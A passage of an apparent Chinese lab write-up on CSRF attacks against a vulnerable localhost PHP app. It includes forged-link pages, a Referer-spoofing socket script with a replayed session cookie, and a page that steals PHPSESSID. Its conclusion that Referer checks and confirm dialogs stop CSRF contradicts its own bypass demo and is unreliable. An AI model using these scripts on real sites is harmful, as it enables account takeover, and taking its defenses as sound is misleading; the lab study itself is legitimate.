<li><p>创建<code>do_adduser.php</code>，接收<code>POST</code>请求并将用户信息写入数据库。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;functions.php&quot;;</span><br><span class="line">start_session($expires);</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&#x27;username&#x27;]))&#123;</span><br><span class="line">	echo &#x27;您没有权限访问此页面&#x27;;</span><br><span class="line">	exit;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include_once &quot;con_database.php&quot;;</span><br><span class="line"></span><br><span class="line">//获取输入的信息</span><br><span class="line">$username = isset($_GET[&#x27;username&#x27;]) ? mysqli_escape_string($con,$_GET[&#x27;username&#x27;]) : &#x27;&#x27;;</span><br><span class="line">$passwd = isset($_GET[&#x27;passwd&#x27;]) ? mysqli_escape_string($con, $_GET[&#x27;passwd&#x27;]) : &#x27;&#x27;;</span><br><span class="line">if($username == &#x27;&#x27; || $passwd == &#x27;&#x27; ) </span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;信息不完整！&#x27;); history.go(-1);&lt;/script&gt;&quot;; </span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br><span class="line">// echo &quot;&lt;script language=&#x27;javascript&#x27;&gt;&quot;;</span><br><span class="line">// echo &quot;var sure=confirm( &#x27;确认添加用户&quot;.$username .&quot;吗 &#x27;); &quot;;</span><br><span class="line">// echo &quot;if (!sure)&#123;location.href=&#x27;newuser.html&#x27;; &#125;&quot;;</span><br><span class="line">// echo &quot;&lt;/script&gt;&quot;;</span><br><span class="line">//执行数据库查询,判断用户是否已经存在</span><br><span class="line">$sql=&quot;select * from users where username = &#x27;$username&#x27; &quot;;</span><br><span class="line"></span><br><span class="line">$query = mysqli_query($con,$sql)</span><br><span class="line">or die(&#x27;SQL语句执行失败, : &#x27;.mysqli_error($con));</span><br><span class="line"></span><br><span class="line">$num = mysqli_fetch_array($query); //统计执行结果影响的行数 </span><br><span class="line">if($num)    //如果已经存在该用户 </span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;用户名已存在!&#x27;); history.go(-1);&lt;/script&gt;&quot;; </span><br><span class="line">	exit;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$sql = &quot;insert into users (username,passcode) values(&#x27;$username&#x27;,&#x27;$passwd&#x27;)&quot;; </span><br><span class="line"></span><br><span class="line">mysqli_query($con, $sql)</span><br><span class="line">or die(&#x27;用户添加失败,  : &#x27;.mysqli_error($con));</span><br><span class="line"></span><br><span class="line">echo &quot;用户添加成功！&quot;;</span><br><span class="line"></span><br><span class="line">mysqli_close($con);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>修改导航链接</strong>：</p>
<ul>
<li><p>在<code>welcome.php</code>添加链接，指向<code>newuser.html</code>页面。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;functions.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">start_session</span>(<span class="variable">$expires</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;欢迎用户&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;登陆&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;showmessage.php&#x27;&gt;查看消息&lt;/a&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;newuser.html&#x27;&gt;添加用户&lt;/a&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;logout.php&#x27;&gt;退出登录&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;您没有权限访问此页面&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h6 id="3-1-3-测试"><a href="#3-1-3-测试" class="headerlink" title="3.1.3 测试"></a><strong>3.1.3 测试</strong></h6><ul>
<li><p>使用Firefox浏览器访问目标网站：</p>
<ul>
<li><p>登录<code>http://localhost/csrf/login.html</code>（用户名：admin，密码：admin123）。</p>
</li>
<li><p>点击“添加用户”链接，输入<code>csrf</code>和<code>csrf123</code>，提交后验证用户添加成功。</p>
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203154931555.png" class="" title="image-20241203154931555">
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203154951702.png" class="" title="image-20241203154951702">
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203155018961.png" class="" title="image-20241203155018961"><img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203155048587.png" class="" title="image-20241203155048587">
</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-2-任务2：建立CSRF攻击网站"><a href="#3-2-任务2：建立CSRF攻击网站" class="headerlink" title="3.2 任务2：建立CSRF攻击网站"></a><strong>3.2 任务2：建立CSRF攻击网站</strong></h5><h6 id="3-2-1-创建攻击网站"><a href="#3-2-1-创建攻击网站" class="headerlink" title="3.2.1 创建攻击网站"></a><strong>3.2.1 创建攻击网站</strong></h6><ul>
<li><p>在Apache根目录下创建文件夹<code>docsrf</code>，用于模拟CSRF攻击网站。</p>
</li>
<li><p>在<code>docsrf</code>目录下创建<code>csrf.html</code>，内容为包含伪造表单提交的恶意代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://localhost/csrf/do_adduser.php?username</span>=<span class="string">admin1&amp;passwd</span>=<span class="string">admin1</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h6 id="3-2-2-恶意代码示例"><a href="#3-2-2-恶意代码示例" class="headerlink" title="3.2.2 恶意代码示例**"></a><strong>3.2.2 </strong>恶意代码示例**</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/csrf/do_adduser.php?username=hacker&amp;password=hack123&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>点击该链接时，伪造请求直接添加用户。</li>
</ul>
<h5 id="3-3-任务3：CSRF攻击测试"><a href="#3-3-任务3：CSRF攻击测试" class="headerlink" title="3.3 任务3：CSRF攻击测试"></a><strong>3.3 任务3：CSRF攻击测试</strong></h5><h6 id="3-3-1-测试流程"><a href="#3-3-1-测试流程" class="headerlink" title="3.3.1 测试流程"></a><strong>3.3.1 测试流程</strong></h6><ol>
<li><p><strong>未登录状态测试</strong>：</p>
<ul>
<li><p>使用IE浏览器访问<code>http://localhost/docsrf/csrf.html</code>。</p>
</li>
<li><p>点击“Click Me”，由于未登录目标网站，添加用户操作失败。</p>
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203160613865.png" class="" title="image-20241203160613865"><img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203160627365.png" class="" title="image-20241203160627365">
</li>
</ul>
</li>
<li><p><strong>已登录状态测试</strong>：</p>
<ul>
<li><p>使用保持登录状态的Firefox浏览器访问<code>http://localhost/docsrf/csrf.html</code>。</p>
</li>
<li><p>点击“Click Me”，发现用户添加成功。</p>
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203161435569.png" class="" title="image-20241203161435569">
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203161448986.png" class="" title="image-20241203161448986">
</li>
</ul>
</li>
</ol>
<h6 id="3-3-2-攻击原理分析"><a href="#3-3-2-攻击原理分析" class="headerlink" title="3.3.2 攻击原理分析"></a><strong>3.3.2 攻击原理分析</strong></h6><ul>
<li>攻击成功的关键在于用户在目标网站的会话Cookie被恶意网站利用，从而伪造合法请求。</li>
</ul>
<hr>
<h5 id="3-4-任务4：CSRF防护"><a href="#3-4-任务4：CSRF防护" class="headerlink" title="3.4 任务4：CSRF防护"></a><strong>3.4 任务4：CSRF防护</strong></h5><h6 id="3-4-1-方法一：HTTP-Referer验证"><a href="#3-4-1-方法一：HTTP-Referer验证" class="headerlink" title="3.4.1 方法一：HTTP Referer验证"></a><strong>3.4.1 方法一：HTTP Referer验证</strong></h6><ol>
<li><p><strong>实现步骤</strong>：</p>
<ul>
<li><p>修改<code>functions.php</code>，增加<code>check_referrer($referer)</code>函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_referer</span>(<span class="params"><span class="variable">$referer</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] != <span class="variable">$referer</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;来源错误&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>do_adduser.php</code>，添加语句:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">check_referer</span>(<span class="string">&#x27;http://localhost/csrf/newuser.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证请求是否来自合法页面。</p>
</li>
</ul>
</li>
<li><p><strong>测试结果</strong>：</p>
<ul>
<li><p>重复攻击步骤，发现由于Referer不匹配，攻击请求被拒绝。</p>
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241203234540092.png" class="" title="image-20241203234540092">
<p>但可以用以下方法攻击，<code>csrf_referer_ez.php</code>，访问<a target="_blank" rel="noopener" href="http://localhost/docsrf/csrf_referer_ez.php">http://localhost/docsrf/csrf_referer_ez.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;csrf&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$server = &#x27;localhost&#x27;;</span><br><span class="line">$host = &#x27;localhost&#x27;;</span><br><span class="line">$target = &#x27;/csrf/do_adduser.php?username=socket&amp;passwd=socket123&#x27;;</span><br><span class="line">$referer = &#x27;http://localhost/csrf/newuser.html&#x27;; // Referer</span><br><span class="line">$uagent =&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0&#x27;; //User-Agent自行修改</span><br><span class="line">$cookie =&#x27;PHPSESSID=9rfa50r1a7ff8os3pgo7ik5cna&#x27;;//自行修改</span><br><span class="line">$port = 80;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($server, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$fp)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;$errstr ($errno)\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$out = &quot;GET $target HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">$out .= &quot;Referer: $referer\r\n&quot;;</span><br><span class="line">$out .= &quot;User-Agent: $uagent\r\n&quot;;</span><br><span class="line">$out .= &quot;Cookie: $cookie\r\n&quot;;</span><br><span class="line">$out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">fwrite($fp, $out);</span><br><span class="line"></span><br><span class="line">while (!feof($fp))</span><br><span class="line">&#123;</span><br><span class="line">echo fgets($fp, 128);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241204004259421.png" class="" title="image-20241204004259421">
<p><code>csrf_auto.html</code>，访问<a target="_blank" rel="noopener" href="http://localhost/docsrf/csrf_auto.html">http://localhost/docsrf/csrf_auto.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://libs.baidu.com/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">getSessionId</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> c_name = <span class="string">&#x27;PHPSESSID&#x27;</span>;  </span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="property">length</span>&gt;<span class="number">0</span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">		c_start=<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(c_name + <span class="string">&quot;=&quot;</span>)  </span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">if</span>(c_start!=-<span class="number">1</span>)&#123;   </span></span><br><span class="line"><span class="language-javascript">		c_start=c_start + c_name.<span class="property">length</span>+<span class="number">1</span>   </span></span><br><span class="line"><span class="language-javascript">		c_end=<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;;&quot;</span>,c_start)  </span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">if</span>(c_end==-<span class="number">1</span>) c_end=<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="property">length</span>  </span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span> <span class="built_in">unescape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">substring</span>(c_start,c_end));  </span></span><br><span class="line"><span class="language-javascript">		&#125;  </span></span><br><span class="line"><span class="language-javascript">	&#125;  </span></span><br><span class="line"><span class="language-javascript">&#125; </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://localhost/csrf/newuser.html&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span> = <span class="string">load()</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://localhost/docsrf/csrf_referer.php?sid=&quot;</span>+<span class="title function_">getSessionId</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>csrf_referer.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;csrf&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if(!isset($_GET[&#x27;sid&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$SID = $_GET[&#x27;sid&#x27;];</span><br><span class="line"></span><br><span class="line">$server = &#x27;localhost&#x27;;</span><br><span class="line">$host = &#x27;localhost&#x27;;</span><br><span class="line">$target = &#x27;/csrf/do_adduser.php?username=socket1&amp;passwd=socket123&#x27;;</span><br><span class="line">$referer = &#x27;http://localhost/csrf/newuser.html&#x27;; // Referer</span><br><span class="line">$uagent =&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0&#x27;; //User-Agent自己改</span><br><span class="line">$port = 80;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($server, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$fp)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;$errstr ($errno)\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$out = &quot;GET $target HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">$out .= &quot;Referer: $referer\r\n&quot;;</span><br><span class="line">$out .= &quot;User-Agent: $uagent\r\n&quot;;</span><br><span class="line">$out .= &quot;Cookie: PHPSESSID=&quot; .$SID .&quot;\r\n&quot;;</span><br><span class="line">$out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">fwrite($fp, $out);</span><br><span class="line"></span><br><span class="line">while (!feof($fp))</span><br><span class="line">&#123;</span><br><span class="line">echo fgets($fp, 128);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241204003402101.png" class="" title="image-20241204003402101"><img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241204004323230.png" class="" title="image-20241204004323230">
</li>
</ul>
</li>
</ol>
<h6 id="3-4-2-方法二：设置操作确认对话框"><a href="#3-4-2-方法二：设置操作确认对话框" class="headerlink" title="3.4.2 方法二：设置操作确认对话框"></a><strong>3.4.2 方法二：设置操作确认对话框</strong></h6><ol>
<li><p><strong>实现步骤</strong>：</p>
<ul>
<li><p>修改<code>do_adduser.php</code>（19行），添加操作确认逻辑：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;var sure=confirm( &#x27;确认添加用户&quot;</span>.<span class="variable">$username</span> .<span class="string">&quot;吗 &#x27;); &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;if (!sure)&#123;location.href=&#x27;newuser.html&#x27;; &#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/script&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>每次操作需要用户手动确认。</p>
</li>
</ul>
</li>
<li><p><strong>测试结果</strong>：</p>
<ul>
<li><p>当用户访问攻击页面时，会弹出对话框提示操作，用户选择“否”后攻击被终止。</p>
<img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241204004630322.png" class="" title="image-20241204004630322"><img src="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/image-20241204004703637.png" class="" title="image-20241204004703637">
</li>
</ul>
</li>
</ol>
<hr>
<h4 id="4-实验结果与总结"><a href="#4-实验结果与总结" class="headerlink" title="4. 实验结果与总结"></a><strong>4. 实验结果与总结</strong></h4><ol>
<li><p><strong>实验结果</strong>：</p>
<ul>
<li>CSRF攻击需要用户在登录目标网站的情况下访问恶意页面。</li>
<li>HTTP Referer验证和操作确认对话框有效阻止了CSRF攻击。</li>
</ul>
</li>
<li><p><strong>实验总结</strong>：</p>
<ul>
<li><strong>Referer验证</strong>：通过检查请求来源，可以识别非法请求。</li>
<li><strong>用户交互</strong>：强制用户确认敏感操作，有效减少误操作带来的风险。</li>
</ul>
</li>
<li><p><strong>安全建议</strong>：</p>
<ul>
<li>避免点击不明链接。</li>
<li>针对敏感操作添加多因素验证机制（如验证码或Token）。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="5-拓展思考"><a href="#5-拓展思考" class="headerlink" title="5. 拓展思考"></a><strong>5. 拓展思考</strong></h4><ol>
<li><p><strong>POST方式的CSRF攻击</strong>：</p>
<ul>
<li><p>攻击者可通过表单隐藏参数的方式伪造POST请求。</p>
</li>
<li><p>示例代码：</p>
